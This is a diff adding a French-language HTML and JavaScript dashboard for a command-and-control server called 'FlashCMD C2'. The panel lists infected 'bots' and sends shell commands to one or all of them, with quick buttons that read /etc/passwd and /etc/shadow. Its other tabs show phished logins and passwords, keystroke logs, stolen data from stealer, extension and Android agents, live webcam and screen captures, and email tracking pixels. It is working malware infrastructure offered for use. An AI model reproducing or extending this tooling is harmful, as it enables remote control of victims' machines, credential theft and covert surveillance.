@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="fr"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>FlashCMD C2</title>
+<style>
+:root{--bg:#0a0a0f;--p:#12121a;--b:#2a2a3a;
+      --r:#e63946;--g:#2ecc71;--y:#f39c12;
+      --t:#e0e0e0;--d:#555;--bl:#3498db}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--t);
+     font-family:'Courier New',monospace;
+     min-height:100vh;display:flex;flex-direction:column}
+.topbar{background:var(--p);border-bottom:1px solid var(--b);
+        padding:10px 16px;display:flex;align-items:center;
+        gap:10px;flex-shrink:0}
+.topbar h1{color:var(--r);font-size:14px;flex:1}
+.stats{display:flex;gap:8px;flex-wrap:wrap}
+.stat{padding:3px 10px;border-radius:3px;
+      font-size:11px;border:1px solid}
+.stat.g{background:rgba(46,204,113,.1);
+         border-color:var(--g);color:var(--g)}
+.stat.r{background:rgba(230,57,70,.1);
+         border-color:var(--r);color:var(--r)}
+.stat.b{background:rgba(52,152,219,.1);
+         border-color:var(--bl);color:var(--bl)}
+.refresh-btn{padding:4px 10px;background:var(--b);
+             border:none;color:var(--t);border-radius:3px;
+             cursor:pointer;font-size:11px;font-family:monospace}
+.body{display:grid;grid-template-columns:260px 1fr;
+      flex:1;overflow:hidden;height:calc(100vh - 46px)}
+.sidebar{background:var(--p);border-right:1px solid var(--b);
+         display:flex;flex-direction:column;overflow:hidden}
+.sidebar-title{padding:10px 12px;font-size:10px;color:var(--d);
+               text-transform:uppercase;letter-spacing:.1em;
+               border-bottom:1px solid var(--b)}
+.bot-list{overflow-y:auto;flex:1;padding:6px}
+.bot{padding:8px 10px;border-radius:4px;cursor:pointer;
+     border:1px solid transparent;font-size:11px;
+     margin-bottom:4px;transition:border .15s}
+.bot:hover{border-color:var(--r)}
+.bot.active{border-color:var(--r);background:rgba(230,57,70,.07)}
+.bot .bid{color:var(--g);font-weight:700;margin-bottom:2px}
+.bot .bip{color:var(--bl);font-size:10px}
+.bot .bos{color:var(--d);font-size:10px}
+.bot .bts{color:var(--d);font-size:10px}
+.main{display:flex;flex-direction:column;overflow:hidden}
+.tabs{display:flex;border-bottom:1px solid var(--b);
+      flex-shrink:0;background:var(--p);overflow-x:auto}
+.tab{padding:9px 14px;cursor:pointer;font-size:11px;
+     color:var(--d);border-bottom:2px solid transparent;
+     transition:all .15s;white-space:nowrap;flex-shrink:0}
+.tab:hover{color:var(--t)}
+.tab.active{color:var(--r);border-bottom-color:var(--r)}
+.tab-content{display:none;flex:1;overflow-y:auto;
+             padding:14px;flex-direction:column;gap:10px}
+.tab-content.active{display:flex}
+.target-label{font-size:12px;color:var(--d);margin-bottom:4px}
+.target-label span{color:var(--r)}
+input[type=text]{width:100%;background:#0d0d14;
+                 border:1px solid var(--b);color:var(--t);
+                 padding:8px 10px;border-radius:4px;
+                 font-family:monospace;font-size:12px;outline:none}
+input[type=text]:focus{border-color:var(--r)}
+.btn-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
+.btn{padding:6px 12px;border:none;border-radius:3px;cursor:pointer;
+     font-size:11px;font-family:monospace;transition:opacity .15s}
+.btn:hover{opacity:.8}
+.btn-r{background:var(--r);color:#fff}
+.btn-g{background:var(--b);color:var(--t)}
+.btn-b{background:#2a2a3a;color:var(--t)}
+.output{background:#0d0d14;border:1px solid var(--b);
+        border-radius:4px;padding:10px;font-size:11px;
+        white-space:pre-wrap;color:var(--g);
+        min-height:100px;max-height:450px;overflow-y:auto;flex:1}
+.cred-line{padding:5px 8px;border-bottom:1px solid var(--b);
+           font-size:11px;display:flex;gap:10px;flex-wrap:wrap}
+.cred-ts{color:var(--d)}
+.cred-ip{color:var(--bl)}
+.cred-em{color:var(--y)}
+.cred-pw{color:var(--r)}
+.frame-grid{display:flex;flex-wrap:wrap;gap:8px}
+.frame-img{border:1px solid var(--b);border-radius:3px;
+           cursor:pointer;transition:border .15s;width:200px}
+.frame-img:hover{border-color:var(--r)}
+.pulse{display:inline-block;width:7px;height:7px;
+       border-radius:50%;background:var(--g);
+       animation:pulse 1.5s infinite;margin-right:6px}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.empty{color:var(--d);font-size:11px;padding:10px}
+.ref-btn{padding:4px 8px;background:var(--b);border:none;
+         color:var(--t);border-radius:3px;cursor:pointer;
+         font-size:10px;font-family:monospace;margin-top:4px;
+         width:50px}
+</style></head>
+<body>
+
+<div class="topbar">
+  <h1><span class="pulse"></span>⚡ FlashCMD C2 Dashboard</h1>
+  <div class="stats">
+    <div class="stat g" id="s-bots">0 bots</div>
+    <div class="stat r" id="s-creds">0 creds</div>
+    <div class="stat b" id="s-kl">0 keylogs</div>
+  </div>
+  <button class="refresh-btn" onclick="refresh()">↻ Refresh</button>
+</div>
+
+<div class="body">
+  <!-- SIDEBAR BOTS -->
+  <div class="sidebar">
+    <div class="sidebar-title">Bots connectés</div>
+    <div class="bot-list" id="bot-list">
+      <div class="empty">Chargement…</div>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+    <div class="tabs">
+      <div class="tab active" onclick="tab('cmd',this)">Commande</div>
+      <div class="tab" onclick="tab('results',this)">Résultats</div>
+      <div class="tab" onclick="tab('creds',this)">Credentials</div>
+      <div class="tab" onclick="tab('keylog',this)">Keylogs</div>
+      <div class="tab" onclick="tab('exfil',this)">Exfil</div>
+      <div class="tab" onclick="tab('live',this)">Live 📸</div>
+      <div class="tab" onclick="tab('visits',this)">Visits</div>
+      <div class="tab" onclick="tab('tracking',this)">Tracking</div>
+    </div>
+
+    <!-- CMD -->
+    <div class="tab-content active" id="tab-cmd">
+      <div class="target-label">
+        Ciblé : <span id="tl">aucun bot sélectionné</span>
+      </div>
+      <input type="text" id="cmd-in"
+        placeholder="whoami | ls -la | cat /etc/passwd | sysinfo | screenshot …"
+        onkeydown="if(event.key==='Enter')pushCmd()">
+      <div class="btn-row">
+        <button class="btn btn-r" onclick="pushCmd()">▶ Envoyer</button>
+        <button class="btn btn-g" onclick="pushAll()">⇶ Envoyer à tous</button>
+        <button class="btn btn-b" onclick="q('sysinfo')">sysinfo</button>
+        <button class="btn btn-b" onclick="q('whoami')">whoami</button>
+        <button class="btn btn-b" onclick="q('screenshot')">screenshot</button>
+        <button class="btn btn-b" onclick="q('ip a||ipconfig')">ip</button>
+        <button class="btn btn-b" onclick="q('ps aux||tasklist')">proc</button>
+        <button class="btn btn-b" onclick="q('ls -la||dir')">ls/dir</button>
+        <button class="btn btn-b" onclick="q('cat /etc/passwd')">passwd</button>
+        <button class="btn btn-b" onclick="q('net user||cat /etc/shadow')">users</button>
+      </div>
+    </div>
+
+    <!-- RESULTS -->
+    <div class="tab-content" id="tab-results">
+      <div style="font-size:11px;color:var(--d)">
+        Sorties des commandes (auto-refresh 10s)
+      </div>
+      <div class="output" id="res-box">Sélectionne un bot…</div>
+      <button class="ref-btn" onclick="loadResults()">↻</button>
+    </div>
+
+    <!-- CREDS -->
+    <div class="tab-content" id="tab-creds">
+      <div style="font-size:11px;color:var(--d)">
+        Credentials phishés — email + password collectés
+      </div>
+      <div class="output" id="creds-box" style="color:var(--t)">
+        Chargement…
+      </div>
+      <button class="ref-btn" onclick="loadCreds()">↻</button>
+    </div>
+
+    <!-- KEYLOG -->
+    <div class="tab-content" id="tab-keylog">
+      <div style="font-size:11px;color:var(--d)">
+        Frappes clavier reçues (JS + .exe + extension)
+      </div>
+      <div class="output" id="kl-box">Chargement…</div>
+      <button class="ref-btn" onclick="loadKL()">↻</button>
+    </div>
+
+    <!-- EXFIL -->
+    <div class="tab-content" id="tab-exfil">
+      <div style="font-size:11px;color:var(--d)">
+        Données exfiltrées (stealer, extension, android)
+      </div>
+      <div class="output" id="exfil-box">Chargement…</div>
+      <button class="ref-btn" onclick="loadExfil()">↻</button>
+    </div>
+
+    <!-- LIVE -->
+    <div class="tab-content" id="tab-live">
+      <div style="font-size:11px;color:var(--d);margin-bottom:8px">
+        Frames caméra + écran (auto-refresh 5s)
+      </div>
+      <div class="frame-grid" id="frames-box">
+        <div class="empty">Chargement…</div>
+      </div>
+    </div>
+
+    <!-- VISITS -->
+    <div class="tab-content" id="tab-visits">
+      <div style="font-size:11px;color:var(--d)">
+        50 dernières visites
+      </div>
+      <div class="output" id="vis-box">Chargement…</div>
+      <button class="ref-btn" onclick="loadVisits()">↻</button>
+    </div>
+
+    <!-- TRACKING -->
+    <div class="tab-content" id="tab-tracking">
+      <div style="font-size:11px;color:var(--d)">
+        Pixels tracking — ouvertures d'emails
+      </div>
+      <div class="output" id="track-box">Chargement…</div>
+      <button class="ref-btn" onclick="loadTracking()">↻</button>
+    </div>
+  </div>
+</div>
+
+<script>
+let sel  = null;
+let bots = {};
+
+// ── tabs ─────────────────────────────────────────────────────
+function tab(name, el) {
+  document.querySelectorAll(".tab-content")
+    .forEach(e => e.classList.remove("active"));
+  document.querySelectorAll(".tab")
+    .forEach(e => e.classList.remove("active"));
+  document.getElementById("tab-" + name)
+    .classList.add("active");
+  el.classList.add("active");
+  if (name === "results")  loadResults();
+  if (name === "creds")    loadCreds();
+  if (name === "keylog")   loadKL();
+  if (name === "exfil")    loadExfil();
+  if (name === "live")     loadFrames();
+  if (name === "visits")   loadVisits();
+  if (name === "tracking") loadTracking();
+}
+
+// ── bots ─────────────────────────────────────────────────────
+async function refresh() {
+  try {
+    const r = await fetch("/c2/bots");
+    bots    = await r.json();
+  } catch { bots = {}; }
+
+  const ids  = Object.keys(bots);
+  const list = document.getElementById("bot-list");
+  list.innerHTML = "";
+  document.getElementById("s-bots").textContent =
+    ids.length + " bot(s)";
+
+  if (!ids.length) {
+    list.innerHTML =
+      '<div class="empty">Aucun bot connecté</div>';
+    return;
+  }
+
+  for (const [id, info] of Object.entries(bots)) {
+    const div = document.createElement("div");
+    div.className =
+      "bot" + (id === sel ? " active" : "");
+    const tasks   = (info.tasks   || []).length;
+    const results = (info.results || []).length;
+    div.innerHTML =
+      `<div class="bid">${id}</div>` +
+      `<div class="bip">${info.ip || "?"}</div>` +
+      `<div class="bos">${(info.os || "?").slice(0,38)}</div>` +
+      `<div class="bts">` +
+        `user:${info.user || "?"} | ` +
+        `t:${tasks} r:${results}` +
+      `</div>` +
+      `<div class="bts">${(info.last_seen || "").slice(0,19)}</div>`;
+    div.onclick = () => selectBot(id, div);
+    list.appendChild(div);
+  }
+}
+
+function selectBot(id, el) {
+  sel = id;
+  document.querySelectorAll(".bot")
+    .forEach(e => e.classList.remove("active"));
+  el.classList.add("active");
+  document.getElementById("tl").textContent = id;
+  loadResults();
+}
+
+// ── commandes ─────────────────────────────────────────────────
+async function pushCmd() {
+  if (!sel) {
+    alert("Sélectionne un bot d'abord");
+    return;
+  }
+  const cmd = document.getElementById("cmd-in")
+              .value.trim();
+  if (!cmd) return;
+  await fetch(`/c2/push/${sel}`, {
+    method:  "POST",
+    headers: { "Content-Type": "application/json" },
+    body:    JSON.stringify({ cmd }),
+  });
+  document.getElementById("cmd-in").value = "";
+  setTimeout(() => { refresh(); loadResults(); }, 2000);
+}
+
+async function pushAll() {
+  const cmd = document.getElementById("cmd-in")
+              .value.trim();
+  if (!cmd) return;
+  for (const id of Object.keys(bots)) {
+    await fetch(`/c2/push/${id}`, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({ cmd }),
+    });
+  }
+  document.getElementById("cmd-in").value = "";
+  setTimeout(refresh, 2000);
+}
+
+function q(cmd) {
+  document.getElementById("cmd-in").value = cmd;
+  pushCmd();
+}
+
+// ── résultats ─────────────────────────────────────────────────
+function loadResults() {
+  if (!sel) return;
+  const bot = bots[sel] || {};
+  const res = bot.results || [];
+  const box = document.getElementById("res-box");
+  if (!res.length) {
+    box.textContent = "(aucun résultat pour ce bot)";
+    return;
+  }
+  const text = res
+    .slice(-20)
+    .map(r => `[${(r.ts || "").slice(0,19)}]\n${r.output}`)
+    .join("\n\n──────────────────────────\n\n");
+  box.textContent = text;
+  box.scrollTop   = box.scrollHeight;
+}
+
+// ── credentials ───────────────────────────────────────────────
+async function loadCreds() {
+  try {
+    const r   = await fetch("/c2/creds");
+    const txt = await r.text();
+    const box = document.getElementById("creds-box");
+    box.innerHTML = "";
+
+    if (!txt.trim() || txt.trim() === "(vide)") {
+      box.textContent = "(aucun credential reçu)";
+      return;
+    }
+
+    let count = 0;
+    txt.trim().split("\n").reverse().forEach(line => {
+      try {
+        const e   = JSON.parse(line);
+        const em  = e.email || e.username || e.user || "";
+        const pw  = e.password || e.pw || e.pass || "";
+        if (!em && !pw) return;
+        const div = document.createElement("div");
+        div.className = "cred-line";
+        div.innerHTML =
+          `<span class="cred-ts">${(e.ts||"").slice(0,19)}</span>` +
+          `<span class="cred-ip">${e.ip||""}</span>` +
+          `<span class="cred-em">${em}</span>` +
+          `<span class="cred-pw">${pw}</span>` +
+          `<span style="color:var(--d)">${e.page||""}</span>`;
+        box.appendChild(div);
+        count++;
+      } catch {}
+    });
+
+    document.getElementById("s-creds").textContent =
+      count + " creds";
+    if (!count) box.textContent = "(aucun login/password reçu)";
+  } catch (e) {
+    document.getElementById("creds-box").textContent =
+      "Erreur: " + e;
+  }
+}
+
+// ── keylogs ───────────────────────────────────────────────────
+async function loadKL() {
+  try {
+    const r   = await fetch("/c2/keylog");
+    const txt = await r.text();
+    const box = document.getElementById("kl-box");
+    if (!txt.trim() || txt.trim() === "(vide)") {
+      box.textContent = "(aucun keylog reçu)";
+      return;
+    }
+    // Afficher les 50 dernières lignes
+    const lines = txt.trim().split("\n");
+    box.textContent =
+      lines.slice(-50).join("\n");
+    box.scrollTop = box.scrollHeight;
+    document.getElementById("s-kl").textContent =
+      lines.length + " keylogs";
+  } catch (e) {
+    document.getElementById("kl-box").textContent =
+      "Erreur: " + e;
+  }
+}
+
+// ── exfil ─────────────────────────────────────────────────────
+async function loadExfil() {
+  try {
+    const r   = await fetch("/c2/exfil");
+    const txt = await r.text();
+    document.getElementById("exfil-box").textContent =
+      txt.trim() || "(vide)";
+  } catch (e) {
+    document.getElementById("exfil-box").textContent =
+      "Erreur: " + e;
+  }
+}
+
+// ── frames live ───────────────────────────────────────────────
+async function loadFrames() {
+  try {
+    const r    = await fetch("/c2/frames");
+    const data = await r.json();
+    const box  = document.getElementById("frames-box");
+    box.innerHTML = "";
+    const frames = data.frames || [];
+    if (!frames.length) {
+      box.innerHTML = '<div class="empty">Aucun frame reçu</div>';
+      return;
+    }
+    frames.slice(-24).reverse().forEach(f => {
+      const wrap = document.createElement("div");
+      wrap.style.cssText =
+        "display:flex;flex-direction:column;gap:4px";
+      const img = document.createElement("img");
+      img.src   = f.url;
+      img.className = "frame-img";
+      img.title = `${f.type} — ${f.ip} — ${f.ts}`;
+      img.onerror = () => { wrap.style.display = "none"; };
+      img.onclick = () => window.open(f.url, "_blank");
+      const lbl = document.createElement("div");
+      lbl.style.cssText =
+        "font-size:9px;color:var(--d);text-align:center";
+      lbl.textContent =
+        `${f.type} | ${f.ip} | ${(f.ts||"").slice(0,16)}`;
+      wrap.appendChild(img);
+      wrap.appendChild(lbl);
+      box.appendChild(wrap);
+    });
+  } catch (e) {
+    document.getElementById("frames-box").innerHTML =
+      `<div class="empty">Erreur: ${e}</div>`;
+  }
+}
+
+// ── visits ────────────────────────────────────────────────────
+async function loadVisits() {
+  try {
+    const r    = await fetch("/c2/visits");
+    const txt  = await r.text();
+    const lines =
+      (txt || "").trim().split("\n").slice(-50);
+    const box =
+      document.getElementById("vis-box");
+    box.textContent =
+      lines.join("\n") || "(vide)";
+    box.scrollTop = box.scrollHeight;
+  } catch (e) {
+    document.getElementById("vis-box").textContent =
+      "Erreur: " + e;
+  }
+}
+
+// ── tracking ──────────────────────────────────────────────────
+async function loadTracking() {
+  try {
+    const r   = await fetch("/c2/tracking");
+    const txt = await r.text();
+    if (!txt.trim() || txt.trim() === "(vide)") {
+      document.getElementById("track-box").textContent =
+        "(aucun pixel ouvert)";
+      return;
+    }
+    const lines = txt.trim().split("\n").reverse();
+    const parsed = lines.map(l => {
+      try {
+        const e = JSON.parse(l);
+        return `[${(e.ts||"").slice(0,19)}] ` +
+               `id=${e.id} | ip=${e.ip} | ` +
+               `ua=${(e.ua||"").slice(0,60)}`;
+      } catch { return l; }
+    });
+    document.getElementById("track-box").textContent =
+      parsed.join("\n");
+  } catch (e) {
+    document.getElementById("track-box").textContent =
+      "Erreur: " + e;
+  }
+}
+
+// ── auto-refresh ──────────────────────────────────────────────
+refresh();
+setInterval(refresh, 10000);
+setInterval(() => {
+  if (sel) loadResults();
+}, 10000);
+setInterval(() => {
+  const live =
+    document.getElementById("tab-live");
+  if (live.classList.contains("active"))
+    loadFrames();
+}, 5000);
+</script>
+</body></html>
